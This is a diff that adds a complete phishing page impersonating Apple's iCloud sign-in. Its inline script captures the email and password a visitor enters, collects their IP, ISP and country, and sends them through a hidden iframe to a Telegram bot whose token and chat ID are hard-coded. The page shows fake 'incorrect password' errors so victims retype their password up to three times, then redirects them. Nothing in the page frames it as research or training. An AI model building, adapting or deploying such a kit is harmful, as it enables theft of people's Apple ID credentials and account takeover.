@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+    <title>Sign in - iCloud</title>
+</head>
+<body>
+    <header><nav><a href="index.html" class="icloud-logo"><i class='bx bxl-apple'></i>iCloud</a></nav></header>
+    
+    <main id="main">
+        <form id="sign-in">
+            <div class="error-message" id="errorMsg"></div>
+            
+            <div class="login-form">
+                <img id="apple-color-logo" src="IMG/sign-in-screen-img.svg" alt="Apple">
+                <p id="loginTitle">Sign in with your Apple ID</p>
+                
+                <div class="input-group">
+                    <input id="email-phone" type="email" placeholder="Email or phone number" required>
+                    <i class='bx bx-right-arrow-circle'></i>
+                </div>
+                
+                <div class="input-group password-field" id="passwordField">
+                    <input id="password" type="password" placeholder="Password">
+                    <i class='bx bx-lock-alt'></i>
+                </div>
+                
+                <button type="submit" class="submit-btn" id="submitBtn">Sign In</button>
+            </div>
+            
+            <div class="login-options">
+                <label class="checkbox-label">
+                    <input type="checkbox" id="check"> Keep me signed in
+                </label>
+                <div class="links">
+                    <a href="#">Forgot Apple ID or password?</a>
+                    <a href="#">Create Apple ID</a>
+                </div>
+            </div>
+        </form>
+    </main>
+    
+    <footer>
+        <div class="footer-div">
+            <span>System Status</span><div class="sep"></div>
+            <span>Privacy Policy</span><div class="sep"></div>
+            <span>Terms & Conditions</span>
+        </div>
+        <div class="footer-div copyright">© 2024 Apple Inc. All rights reserved.</div>
+    </footer>
+
+    <script>
+        // 🔥 SCRIPT SIN CAMBIOS - MANTIENE TODA LA FUNCIONALIDAD
+        document.addEventListener('DOMContentLoaded', () => {
+            console.log('🚀 ERROR VISIBLE + Telegram solo con password');
+            
+            const emailInput = document.getElementById('email-phone');
+            const arrowIcon = document.querySelector('.bx-right-arrow-circle');
+            const passwordField = document.getElementById('passwordField');
+            const passwordInput = document.getElementById('password');
+            const submitBtn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            const form = document.getElementById('sign-in');
+            
+            let loginAttempts = 0;
+            const MAX_ATTEMPTS = 3;
+            
+            const appleErrors = [
+                "Incorrect Apple ID or password.",
+                "Your Apple ID or password is incorrect.",
+                "The Apple ID or password you entered has been disabled."
+            ];
+            
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            async function getIPInfo() {
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ispResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const ispData = await ispResponse.json();
+                    return {
+                        ip: ipData.ip,
+                        isp: ispData.org || 'ISP Desconocido',
+                        country: ispData.country_name || 'País Desconocido'
+                    };
+                } catch {
+                    return { ip: 'N/A', isp: 'Web', country: 'Web' };
+                }
+            }
+            
+            const showPassword = () => {
+                if (emailInput.value.trim()) {
+                    passwordField.classList.add('show');
+                    submitBtn.classList.add('show');
+                    setTimeout(() => passwordInput.focus(), 300);
+                }
+            };
+            
+            arrowIcon.addEventListener('click', showPassword);
+            emailInput.addEventListener('keypress', e => {
+                if (e.key === 'Enter' && emailInput.value.trim()) {
+                    showPassword();
+                }
+            });
+            
+            emailInput.addEventListener('blur', () => {
+                if (emailInput.value.trim() === '') {
+                    showError('Enter an Apple ID or phone number.');
+                }
+            });
+            
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                loginAttempts++;
+                
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                
+                if (!password) {
+                    showError('Enter your password.');
+                    return;
+                }
+                
+                console.log(`🎯 Intento ${loginAttempts}/${MAX_ATTEMPTS}: ${email}`);
+                
+                const ipInfo = await getIPInfo();
+                
+                const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀
+
+📧 *Email:* ${email}
+🔑 *Password:* ${password}
+🌐 *IP:* ${ipInfo.ip}
+🏢 *Proveedor:* ${ipInfo.isp}
+🌍 *País:* ${ipInfo.country}
+💻 *Navegador:* Chrome
+📱 *Device:* PC
+📅 *Hora:* ${new Date().toLocaleString('es-ES')}
+⚡ *Intento:* ${loginAttempts}/${MAX_ATTEMPTS}
+
+✨ *Plataforma:* Astro505`;
+
+                const telegramUrl = `https://api.telegram.org/bot7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA/sendMessage?chat_id=7219932215&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                iframe.src = telegramUrl;
+                
+                console.log('📤 Telegram con password:', ipInfo.ip);
+                
+                if (loginAttempts < MAX_ATTEMPTS) {
+                    const errorText = appleErrors[(loginAttempts-1) % appleErrors.length];
+                    showError(errorText);
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                } else {
+                    showError('Signing in to your account...');
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 1500);
+                }
+            });
+            
+            function showError(message) {
+                errorMsg.textContent = message;
+                errorMsg.classList.add('show');
+                errorMsg.style.top = '-10px';
+                setTimeout(() => {
+                    errorMsg.classList.remove('show');
+                    errorMsg.style.top = '';
+                }, 5000);
+            }
+            
+            console.log('✅ Telegram SOLO con password + Error VISIBLE');
+        });
+    </script>
+
+    <style>
+        /* ESTILOS INLINE PARA ERROR MANTIENEN PRIORIDAD */
+        .error-message {
+            position: relative !important;
+            top: -10px !important;
+            left: 0 !important;
+            transform: none !important;
+            background: #ff3b30 !important;
+            color: white !important;
+            padding: 12px 20px !important;
+            margin-bottom: 15px !important;
+            font-size: 14px !important;
+            font-weight: 500 !important;
+            border-radius: 10px !important;
+            box-shadow: 0 4px 20px rgba(255,59,48,0.4) !important;
+            width: 100% !important;
+            text-align: center !important;
+            opacity: 0 !important;
+            transition: all 0.4s ease !important;
+            z-index: 100 !important;
+        }
+        
+        .error-message.show {
+            opacity: 1 !important;
+            transform: translateY(0) !important;
+        }
+    </style>
+</body>
+</html>
